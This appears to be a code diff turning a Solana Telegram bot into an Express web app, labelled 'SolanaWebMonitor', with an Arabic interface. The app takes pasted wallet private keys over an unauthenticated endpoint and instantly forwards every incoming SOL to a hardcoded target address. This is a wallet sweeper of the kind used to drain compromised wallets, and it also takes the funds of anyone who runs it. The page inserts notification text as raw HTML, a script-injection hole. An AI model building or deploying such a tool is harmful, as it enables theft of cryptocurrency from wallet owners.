@@ -1,10 +1,9 @@
 const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
 const bs58 = require('bs58').default;
-const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 require('dotenv').config();
 
-class SolanaTelegramBot {
+class SolanaWebMonitor {
     convertToHttpUrl(url) {
         // Convert WebSocket URLs to HTTP URLs for Connection
         if (url.startsWith('wss://')) {
@@ -17,8 +16,8 @@ class SolanaTelegramBot {
     }
 
     constructor() {
-        // Initialize Telegram bot
-        this.bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
+        // Initialize web monitoring system
+        this.logs = [];
         
         // Target address to forward funds to
         this.targetAddress = new PublicKey('FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG');
@@ -39,111 +38,63 @@ class SolanaTelegramBot {
         ].filter(url => url) // Remove undefined URLs
          .map(url => this.convertToHttpUrl(url)); // Convert WebSocket URLs to HTTP
         
-        // Store chat ID for notifications
-        this.chatId = null;
+        // Store notifications for web interface
+        this.notifications = [];
         
         // Track RPC errors
         this.rpcErrorCounts = new Array(this.rpcUrls.length).fill(0);
         this.lastRpcErrorTime = new Array(this.rpcUrls.length).fill(0);
         this.rpcFailedWallets = new Set(); // Track wallets with failed RPCs
         
-        this.setupBotCommands();
-        console.log('🤖 Solana Telegram Bot initialized');
+        console.log('🌐 Solana Web Monitor initialized');
         console.log(`🔗 Available RPC URLs: ${this.rpcUrls.length}`);
     }
     
-    setupBotCommands() {
-        // Start command
-        this.bot.onText(/\/start/, (msg) => {
-            const chatId = msg.chat.id;
-            const welcomeMessage = `🔥 مرحباً بك في بوت مراقبة محافظ Solana!
-
-📋 الأوامر المتاحة:
-/add_wallets - إضافة محافظ للمراقبة
-/status - عرض حالة المحافظ
-/stop - إيقاف/تشغيل محافظ محددة
-/help - عرض المساعدة
-
-💡 لبدء المراقبة، استخدم الأمر /add_wallets وأرسل المفاتيح الخاصة في رسالة واحدة (كل مفتاح في سطر منفصل)`;
-            
-            this.bot.sendMessage(chatId, welcomeMessage);
-        });
+    addLog(message, type = 'info') {
+        const log = {
+            id: Date.now(),
+            message,
+            type,
+            timestamp: new Date().toISOString()
+        };
+        this.logs.unshift(log);
         
-        // Add wallets command
-        this.bot.onText(/\/add_wallets/, (msg) => {
-            const chatId = msg.chat.id;
-            const message = `📝 أرسل المفاتيح الخاصة للمحافظ التي تريد مراقبتها:
-
-⚠️ تعليمات مهمة:
-• ضع كل مفتاح خاص في سطر منفصل
-• يمكنك إضافة حتى ${this.rpcUrls.length} محفظة
-• كل محفظة ستُراقب بـ RPC منفصل
-• المفاتيح يجب أن تكون بصيغة Base58
-
-مثال:
-5J1F7GHaDxuucP2VX7rciRchxrDsNo1SyJ61112233445566...
-3K8H9JDa8xTvP1WX5rciRchxrDsNo1SyJ61112233445566...
-
-أرسل المفاتيح الآن:`;
-            
-            this.bot.sendMessage(chatId, message);
-            
-            // Wait for next message with private keys
-            this.bot.once('message', (response) => {
-                if (response.chat.id === chatId && !response.text.startsWith('/')) {
-                    this.processPrivateKeys(chatId, response.text);
-                }
-            });
-        });
+        // Keep only last 100 logs
+        if (this.logs.length > 100) {
+            this.logs = this.logs.slice(0, 100);
+        }
         
-        // Status command
-        this.bot.onText(/\/status/, async (msg) => {
-            const chatId = msg.chat.id;
-            await this.showStatus(chatId);
-        });
-        
-        // Simple stop command
-        this.bot.onText(/\/stop/, (msg) => {
-            const chatId = msg.chat.id;
-            const stoppedCount = this.stopAllMonitoring();
-            this.bot.sendMessage(chatId, `⏹️ تم إيقاف مراقبة جميع المحافظ`);
-        });
-        
-        // Help command
-        this.bot.onText(/\/help/, (msg) => {
-            const chatId = msg.chat.id;
-            const helpMessage = `📚 دليل الاستخدام:
-
-🔑 إضافة المحافظ:
-1. استخدم /add_wallets
-2. أرسل المفاتيح الخاصة (كل مفتاح في سطر منفصل)
-3. سيبدأ البوت مراقبة المحافظ فوراً
-
-📊 مراقبة المحافظ:
-• كل محفظة تُراقب بـ RPC منفصل
-• عند وصول SOL، سيتم تحويله فوراً
-• ستحصل على إشعار لكل عملية
-
-⚙️ الأوامر:
-/status - حالة المحافظ
-/stop - إيقاف جميع المحافظ
-/add_wallets - إضافة محافظ جديدة`;
-            
-            this.bot.sendMessage(chatId, helpMessage);
-        });
+        console.log(`[${type.toUpperCase()}] ${message}`);
     }
     
-    processPrivateKeys(chatId, keysText) {
+    addNotification(message, type = 'info') {
+        const notification = {
+            id: Date.now(),
+            message,
+            type,
+            timestamp: new Date().toISOString()
+        };
+        this.notifications.unshift(notification);
+        
+        // Keep only last 50 notifications
+        if (this.notifications.length > 50) {
+            this.notifications = this.notifications.slice(0, 50);
+        }
+        
+        this.addLog(message, type);
+    }
+    
+    processPrivateKeys(keysText) {
         const privateKeys = keysText.split('\n').filter(key => key.trim());
         
         if (privateKeys.length === 0) {
-            this.bot.sendMessage(chatId, '❌ لم يتم العثور على مفاتيح صالحة');
-            return;
+            this.addNotification('❌ لم يتم العثور على مفاتيح صالحة', 'error');
+            return { success: false, message: 'لم يتم العثور على مفاتيح صالحة' };
         }
         
         if (privateKeys.length > this.rpcUrls.length) {
-            this.bot.sendMessage(chatId, `⚠️ يمكنك إضافة حتى ${this.rpcUrls.length} محفظة فقط (عدد RPC URLs المتاحة)`);
-            return;
+            this.addNotification(`⚠️ يمكنك إضافة حتى ${this.rpcUrls.length} محفظة فقط (عدد RPC URLs المتاحة)`, 'warning');
+            return { success: false, message: `يمكنك إضافة حتى ${this.rpcUrls.length} محفظة فقط` };
         }
         
         // Stop current monitoring
@@ -170,22 +121,23 @@ class SolanaTelegramBot {
                 console.log(`🔗 Using RPC: ${this.rpcUrls[i]}`);
                 
             } catch (error) {
-                this.bot.sendMessage(chatId, `❌ خطأ في المفتاح ${i + 1}: ${error.message}`);
+                this.addNotification(`❌ خطأ في المفتاح ${i + 1}: ${error.message}`, 'error');
                 continue;
             }
         }
         
         if (successCount > 0) {
-            this.bot.sendMessage(chatId, `✅ تم تحميل ${successCount} محفظة بنجاح!`);
-            this.startMonitoring(chatId);
+            this.addNotification(`✅ تم تحميل ${successCount} محفظة بنجاح!`, 'success');
+            this.startMonitoring();
+            return { success: true, message: `تم تحميل ${successCount} محفظة بنجاح` };
         } else {
-            this.bot.sendMessage(chatId, '❌ فشل في تحميل أي محفظة');
+            this.addNotification('❌ فشل في تحميل أي محفظة', 'error');
+            return { success: false, message: 'فشل في تحميل أي محفظة' };
         }
     }
     
-    async startMonitoring(chatId) {
-        this.chatId = chatId;
-        this.bot.sendMessage(chatId, '🔍 بدء مراقبة المحافظ...');
+    async startMonitoring() {
+        this.addNotification('🔍 بدء مراقبة المحافظ...', 'info');
         
         // Store subscription IDs to track active subscriptions
         this.subscriptionIds = [];
@@ -202,10 +154,10 @@ class SolanaTelegramBot {
                 this.lastBalances[i] = initialBalance;
                 
                 if (initialBalance > 0) {
-                    // Send funds immediately without waiting for Telegram message
-                    const sendPromise = this.forwardFunds(chatId, connection, wallet, initialBalance, walletIndex);
+                    // Send funds immediately
+                    const sendPromise = this.forwardFunds(connection, wallet, initialBalance, walletIndex);
                     // Send notification in parallel
-                    this.bot.sendMessage(chatId, `💰 المحفظة ${walletIndex}: رصيد موجود ${initialBalance / LAMPORTS_PER_SOL} SOL`);
+                    this.addNotification(`💰 المحفظة ${walletIndex}: رصيد موجود ${initialBalance / LAMPORTS_PER_SOL} SOL`, 'info');
                     await sendPromise;
                 }
             } catch (error) {
@@ -226,10 +178,10 @@ class SolanaTelegramBot {
                                 const received = newBalance - oldBalance;
                                 console.log(`💰 Wallet ${walletIndex}: Balance changed from ${oldBalance} to ${newBalance} lamports`);
                                 
-                                // Send funds immediately without waiting for Telegram message
-                                const sendPromise = this.forwardFunds(chatId, connection, wallet, newBalance, walletIndex);
-                                // Send Telegram notification in parallel (non-blocking)
-                                this.bot.sendMessage(chatId, `💰 المحفظة ${walletIndex}: وصل ${received / LAMPORTS_PER_SOL} SOL`);
+                                // Send funds immediately
+                                const sendPromise = this.forwardFunds(connection, wallet, newBalance, walletIndex);
+                                // Send notification in parallel (non-blocking)
+                                this.addNotification(`💰 المحفظة ${walletIndex}: وصل ${received / LAMPORTS_PER_SOL} SOL`, 'success');
                                 await sendPromise;
                             }
                             
@@ -253,7 +205,7 @@ class SolanaTelegramBot {
             }
         }
         
-        this.bot.sendMessage(chatId, `✅ تم بدء مراقبة ${this.wallets.length} محفظة عبر WebSocket`);
+        this.addNotification(`✅ تم بدء مراقبة ${this.wallets.length} محفظة عبر WebSocket`, 'success');
     }
     
     async getBalance(connection, publicKey) {
@@ -261,7 +213,7 @@ class SolanaTelegramBot {
         return balance;
     }
     
-    async forwardFunds(chatId, connection, wallet, amount, walletIndex) {
+    async forwardFunds(connection, wallet, amount, walletIndex) {
         try {
             const startTime = Date.now();
             
@@ -270,7 +222,7 @@ class SolanaTelegramBot {
             const amountToSend = amount - transactionFee;
             
             if (amountToSend <= 0) {
-                this.bot.sendMessage(chatId, `⚠️ المحفظة ${walletIndex}: المبلغ قليل جداً بعد خصم الرسوم`);
+                this.addNotification(`⚠️ المحفظة ${walletIndex}: المبلغ قليل جداً بعد خصم الرسوم`, 'warning');
                 return false;
             }
             
@@ -302,19 +254,18 @@ class SolanaTelegramBot {
 📝 المعاملة: https://solscan.io/tx/${signature}
 ⚡ وقت التنفيذ: ${executionTime}ms`;
             
-            this.bot.sendMessage(chatId, successMessage);
+            this.addNotification(successMessage, 'success');
             return true;
             
         } catch (error) {
-            this.bot.sendMessage(chatId, `❌ المحفظة ${walletIndex}: خطأ في التحويل - ${error.message}`);
+            this.addNotification(`❌ المحفظة ${walletIndex}: خطأ في التحويل - ${error.message}`, 'error');
             return false;
         }
     }
     
-    async showStatus(chatId) {
+    async getStatus() {
         if (this.wallets.length === 0) {
-            this.bot.sendMessage(chatId, '📊 لا توجد محافظ قيد المراقبة');
-            return;
+            return { message: '📊 لا توجد محافظ قيد المراقبة', wallets: [] };
         }
         
         let statusMessage = `📊 حالة المحافظ:\n\n`;
@@ -361,7 +312,17 @@ class SolanaTelegramBot {
         
         statusMessage += `🎯 عنوان الهدف: ${this.targetAddress.toString()}`;
         
-        this.bot.sendMessage(chatId, statusMessage);
+        return { 
+            message: statusMessage,
+            wallets: this.wallets.map((wallet, i) => ({
+                index: i + 1,
+                address: wallet.publicKey.toString(),
+                rpcUrl: this.rpcUrls[i],
+                errorCount: this.rpcErrorCounts[i],
+                isFailed: this.rpcFailedWallets.has(i + 1),
+                hasSubscription: this.subscriptionIds[i] !== null && this.subscriptionIds[i] !== undefined
+            }))
+        };
     }
     
     handleRpcError(error, rpcIndex, walletIndex) {
@@ -396,9 +357,7 @@ class SolanaTelegramBot {
 💡 لإعادة التشغيل: استخدم /add_wallets مع RPC جديد
 ⚠️ لن تصلك المزيد من الرسائل لهذه المحفظة`;
                 
-                if (this.chatId) {
-                    this.bot.sendMessage(this.chatId, stopMessage);
-                }
+                this.addNotification(stopMessage, 'error');
             }
         } else {
             // Only send error notification for first few errors, not every error
@@ -414,9 +373,7 @@ class SolanaTelegramBot {
 
 💡 سيتم إيقاف المراقبة إذا استمرت المشاكل`;
                 
-                if (this.chatId) {
-                    this.bot.sendMessage(this.chatId, warningMessage);
-                }
+                this.addNotification(warningMessage, 'warning');
             }
         }
         
@@ -444,25 +401,20 @@ class SolanaTelegramBot {
         this.rpcErrorCounts.fill(0);
         this.lastRpcErrorTime.fill(0);
         this.rpcFailedWallets.clear();
-        this.chatId = null;
+        // Clear notifications on stop
+        this.addNotification('🛑 تم إيقاف مراقبة جميع المحافظ', 'info');
         
         console.log('🛑 All WebSocket monitoring stopped');
     }
 }
 
-// Initialize and start the bot
+// Initialize the monitor
+const monitor = new SolanaWebMonitor();
+
 async function main() {
-    console.log('🤖 Starting Solana Telegram Bot...');
+    console.log('🌐 Starting Solana Web Monitor...');
     console.log('=====================================');
-    
-    if (!process.env.TELEGRAM_BOT_TOKEN) {
-        console.error('❌ TELEGRAM_BOT_TOKEN environment variable is required');
-        process.exit(1);
-    }
-    
-    const bot = new SolanaTelegramBot();
-    
-    console.log('✅ Bot is running and waiting for commands...');
+    console.log('✅ Monitor is ready for web interface...');
 }
 
 // Handle uncaught exceptions
@@ -480,27 +432,487 @@ main().catch(error => {
     process.exit(1);
 });
 
-// Add Express server for deployment
+// Express server with HTML interface
 const app = express();
 const PORT = process.env.PORT || 5000;
 
+// Middleware
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use((req, res, next) => {
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
+    next();
+});
+
+// Main HTML interface
 app.get('/', (req, res) => {
-    res.json({
-        status: 'Bot is running',
-        message: 'Solana Telegram Bot is active',
-        timestamp: new Date().toISOString()
-    });
+    const html = `<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مراقب محافظ Solana</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 30px;
+            padding: 30px;
+        }
+        
+        .left-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .card {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
+            border-radius: 15px;
+            padding: 25px;
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+        
+        .card h2 {
+            color: #495057;
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #495057;
+        }
+        
+        textarea {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            font-size: 14px;
+            resize: vertical;
+            min-height: 120px;
+            font-family: monospace;
+        }
+        
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+        }
+        
+        .btn.secondary {
+            background: linear-gradient(45deg, #6c757d, #495057);
+        }
+        
+        .btn.danger {
+            background: linear-gradient(45deg, #dc3545, #c82333);
+        }
+        
+        .right-panel {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .status-display {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            font-family: monospace;
+            font-size: 14px;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+            border: 2px solid #e9ecef;
+        }
+        
+        .notifications {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+            border: 2px solid #e9ecef;
+        }
+        
+        .notification {
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            border-left: 4px solid #667eea;
+        }
+        
+        .notification.success {
+            background: #d4edda;
+            border-color: #28a745;
+        }
+        
+        .notification.error {
+            background: #f8d7da;
+            border-color: #dc3545;
+        }
+        
+        .notification.warning {
+            background: #fff3cd;
+            border-color: #ffc107;
+        }
+        
+        .notification.info {
+            background: #d1ecf1;
+            border-color: #17a2b8;
+        }
+        
+        .timestamp {
+            font-size: 12px;
+            color: #6c757d;
+            margin-top: 5px;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            border: 2px solid #e9ecef;
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #667eea;
+        }
+        
+        .stat-label {
+            color: #6c757d;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+        }
+        
+        .loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 مراقب محافظ Solana</h1>
+            <p>مراقبة وتحويل الأموال تلقائياً من محافظ Solana</p>
+        </div>
+        
+        <div class="main-content">
+            <div class="left-panel">
+                <div class="stats" id="stats">
+                    <div class="stat-card">
+                        <div class="stat-value" id="walletCount">0</div>
+                        <div class="stat-label">المحافظ المراقبة</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="activeCount">0</div>
+                        <div class="stat-label">النشطة</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="errorCount">0</div>
+                        <div class="stat-label">الأخطاء</div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <h2>📝 إضافة محافظ للمراقبة</h2>
+                    <form id="addWalletsForm">
+                        <div class="form-group">
+                            <label for="privateKeys">المفاتيح الخاصة (كل مفتاح في سطر منفصل):</label>
+                            <textarea id="privateKeys" placeholder="ضع المفاتيح الخاصة هنا...\nكل مفتاح في سطر منفصل\nمثال: 5J1F7GHaDxuucP2VX7rciRchxrDsNo1SyJ...\n3K8H9JDa8xTvP1WX5rciRchxrDsNo1SyJ..."></textarea>
+                        </div>
+                        <button type="submit" class="btn" id="addBtn">إضافة المحافظ</button>
+                    </form>
+                </div>
+                
+                <div class="card">
+                    <h2>📊 حالة المحافظ</h2>
+                    <button type="button" class="btn secondary" id="statusBtn">عرض الحالة</button>
+                    <div class="status-display" id="statusDisplay"></div>
+                </div>
+                
+                <div class="card">
+                    <h2>⏹️ إيقاف المراقبة</h2>
+                    <button type="button" class="btn danger" id="stopBtn">إيقاف جميع المحافظ</button>
+                </div>
+            </div>
+            
+            <div class="right-panel">
+                <div class="card">
+                    <h2>🔔 الإشعارات المباشرة</h2>
+                    <div class="notifications" id="notifications">
+                        <div class="notification info">
+                            <div>مرحباً بك في مراقب محافظ Solana!</div>
+                            <div class="timestamp">${new Date().toLocaleString('ar-EG')}</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let updateInterval;
+        
+        // Auto refresh notifications every 2 seconds
+        function startAutoRefresh() {
+            updateInterval = setInterval(loadNotifications, 2000);
+        }
+        
+        // Load notifications
+        async function loadNotifications() {
+            try {
+                const response = await fetch('/api/notifications');
+                const notifications = await response.json();
+                displayNotifications(notifications);
+                updateStats();
+            } catch (error) {
+                console.error('Error loading notifications:', error);
+            }
+        }
+        
+        // Display notifications
+        function displayNotifications(notifications) {
+            const container = document.getElementById('notifications');
+            if (notifications.length === 0) {
+                container.innerHTML = '<div class="notification info">لا توجد إشعارات حالياً</div>';
+                return;
+            }
+            
+            container.innerHTML = notifications.map(notif => 
+                '<div class="notification ' + notif.type + '">' +
+                    '<div>' + notif.message + '</div>' +
+                    '<div class="timestamp">' + new Date(notif.timestamp).toLocaleString('ar-EG') + '</div>' +
+                '</div>'
+            ).join('');
+        }
+        
+        // Update statistics
+        async function updateStats() {
+            try {
+                const response = await fetch('/api/status');
+                const status = await response.json();
+                
+                document.getElementById('walletCount').textContent = status.wallets.length;
+                document.getElementById('activeCount').textContent = status.wallets.filter(w => w.hasSubscription && !w.isFailed).length;
+                document.getElementById('errorCount').textContent = status.wallets.reduce((sum, w) => sum + w.errorCount, 0);
+            } catch (error) {
+                console.error('Error updating stats:', error);
+            }
+        }
+        
+        // Add wallets form
+        document.getElementById('addWalletsForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('addBtn');
+            const privateKeys = document.getElementById('privateKeys').value;
+            
+            if (!privateKeys.trim()) {
+                alert('الرجاء إدخال المفاتيح الخاصة');
+                return;
+            }
+            
+            btn.textContent = 'جاري الإضافة...';
+            btn.disabled = true;
+            
+            try {
+                const response = await fetch('/api/add-wallets', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ privateKeys })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    document.getElementById('privateKeys').value = '';
+                    alert('تم إضافة المحافظ بنجاح!');
+                } else {
+                    alert('خطأ: ' + result.message);
+                }
+            } catch (error) {
+                alert('خطأ في الاتصال: ' + error.message);
+            } finally {
+                btn.textContent = 'إضافة المحافظ';
+                btn.disabled = false;
+            }
+        });
+        
+        // Status button
+        document.getElementById('statusBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('statusBtn');
+            const display = document.getElementById('statusDisplay');
+            
+            btn.textContent = 'جاري التحديث...';
+            btn.disabled = true;
+            
+            try {
+                const response = await fetch('/api/status');
+                const status = await response.json();
+                display.textContent = status.message;
+            } catch (error) {
+                display.textContent = 'خطأ في تحميل الحالة: ' + error.message;
+            } finally {
+                btn.textContent = 'عرض الحالة';
+                btn.disabled = false;
+            }
+        });
+        
+        // Stop monitoring button
+        document.getElementById('stopBtn').addEventListener('click', async () => {
+            if (!confirm('هل أنت متأكد من إيقاف مراقبة جميع المحافظ؟')) {
+                return;
+            }
+            
+            const btn = document.getElementById('stopBtn');
+            btn.textContent = 'جاري الإيقاف...';
+            btn.disabled = true;
+            
+            try {
+                const response = await fetch('/api/stop', { method: 'POST' });
+                const result = await response.json();
+                alert(result.message);
+            } catch (error) {
+                alert('خطأ في الاتصال: ' + error.message);
+            } finally {
+                btn.textContent = 'إيقاف جميع المحافظ';
+                btn.disabled = false;
+            }
+        });
+        
+        // Start auto refresh when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            loadNotifications();
+            startAutoRefresh();
+        });
+    </script>
+</body>
+</html>`;
+    
+    res.send(html);
+});
+
+// API Routes
+app.post('/api/add-wallets', (req, res) => {
+    const { privateKeys } = req.body;
+    const result = monitor.processPrivateKeys(privateKeys);
+    res.json(result);
+});
+
+app.get('/api/status', async (req, res) => {
+    const status = await monitor.getStatus();
+    res.json(status);
+});
+
+app.post('/api/stop', (req, res) => {
+    monitor.stopAllMonitoring();
+    res.json({ success: true, message: 'تم إيقاف مراقبة جميع المحافظ' });
+});
+
+app.get('/api/notifications', (req, res) => {
+    res.json(monitor.notifications);
 });
 
 app.get('/health', (req, res) => {
     res.json({
         status: 'healthy',
         uptime: process.uptime(),
+        wallets: monitor.wallets.length,
+        monitoring: monitor.subscriptionIds.filter(id => id !== null).length,
         timestamp: new Date().toISOString()
     });
 });
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🌐 Express server running on port ${PORT}`);
+    console.log(`🔗 Web interface: http://localhost:${PORT}`);
     console.log(`🔗 Health check: http://localhost:${PORT}/health`);
 });
